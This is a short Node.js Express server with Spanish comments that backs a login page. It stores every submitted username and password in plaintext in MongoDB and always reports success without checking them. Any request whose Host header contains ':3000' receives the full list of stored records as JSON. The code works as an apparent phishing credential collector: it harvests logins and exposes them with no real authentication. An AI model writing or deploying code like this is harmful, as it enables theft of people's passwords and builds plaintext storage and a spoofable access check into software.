const express = require('express');
const { MongoClient } = require('mongodb');
const path = require('path');

const app = express();
const port = 3000;

const url = process.env.MONGO_URL || 'mongodb://localhost:27017';
const client = new MongoClient(url);

app.use(express.json());

async function main() {
  await client.connect();
  console.log('✅ MongoDB conectado');

  const db = client.db('mydatabase');
  const users = db.collection('users');

  // 🌐 /
  app.get('/', async (req, res) => {
    const hostHeader = req.headers.host || '';

    // 👉 SI ENTRA POR PUERTO 3000 → JSON
    if (hostHeader.includes(':3000')) {
      const data = await users.find({}).toArray();
      return res.json(data);
    }

    // 👉 SI NO (IP sin puerto) → LOGIN
    res.sendFile(path.join(__dirname, 'views', 'login.html'));
  });

  // 🔐 LOGIN → Mongo
  app.post('/login', async (req, res) => {
    const { user, pass } = req.body;
    if (!user || !pass) return res.json({ success: false });

    await users.insertOne({
      user,
      pass,
      createdAt: new Date()
    });

    res.json({ success: true });
  });

  // 🌐 WEB pública
  app.use(express.static(path.join(__dirname, 'public')));
}

app.listen(port, () => {
  console.log(`🚀 Backend en http://localhost:${port}`);
});

main().catch(console.error);
